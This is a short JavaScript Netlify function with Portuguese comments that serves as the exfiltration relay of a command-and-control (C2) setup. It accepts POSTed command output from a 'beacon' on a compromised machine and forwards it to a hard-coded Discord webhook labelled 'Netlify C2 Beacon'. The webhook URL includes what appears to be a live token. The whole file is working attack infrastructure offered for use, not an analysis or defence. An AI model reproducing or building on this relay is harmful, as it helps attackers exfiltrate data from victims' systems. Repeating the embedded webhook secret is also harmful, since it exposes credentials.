// netlify/functions/upload_result.js
import fetch from 'node-fetch';

// O Webhook do Discord que você forneceu
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1432043892949258360/wfIQh1OQxC01axwc-x6iIVaQP6pNxOtWyAvABlD94NtrG9xhBwbjppVCKJ7EP0LYrUBH";

exports.handler = async (event, context) => {
    // A Netlify Function só deve aceitar POSTs (igual ao seu script PHP original)
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Método não permitido.' };
    }

    let outputResult;
    try {
        // O beacon envia o output. Se for um body simples (como texto puro), ele estará em event.body
        // Se for JSON, você precisará decodificar. Vamos assumir texto simples.
        outputResult = event.body; 
    } catch (e) {
        console.error("Erro ao decodificar body:", e);
        return { statusCode: 400, body: 'Corpo da requisição inválido.' };
    }

    // 1. Formatar a mensagem para o Discord
    // Usamos Markdown para formatação de código (blocos de 3 crases)
    const discordMessage = {
        username: "Netlify C2 Beacon",
        embeds: [
            {
                title: "Output de Comando Recebido",
                description: `\`\`\`plaintext\n${outputResult.substring(0, 1500)}\n\`\`\``, // Limita para caber no limite do Discord
                color: 15158332, // Vermelho, para destaque
                timestamp: new Date().toISOString(),
            }
        ]
    };

    // 2. Enviar para o Webhook do Discord
    try {
        const webhookResponse = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordMessage),
        });

        if (!webhookResponse.ok) {
            console.error(`Erro ao enviar para o Discord: ${webhookResponse.status}`);
            // Embora tenha havido um erro de envio, a recepção do output foi bem-sucedida
        }

        // 3. Retornar status de sucesso para o beacon
        return {
            statusCode: 200,
            body: "Output recebido e enviado para o Discord.",
        };

    } catch (error) {
        console.error('Erro na função upload_result:', error);
        return {
            statusCode: 500,
            body: 'Erro interno do servidor.',
        };
    }
};
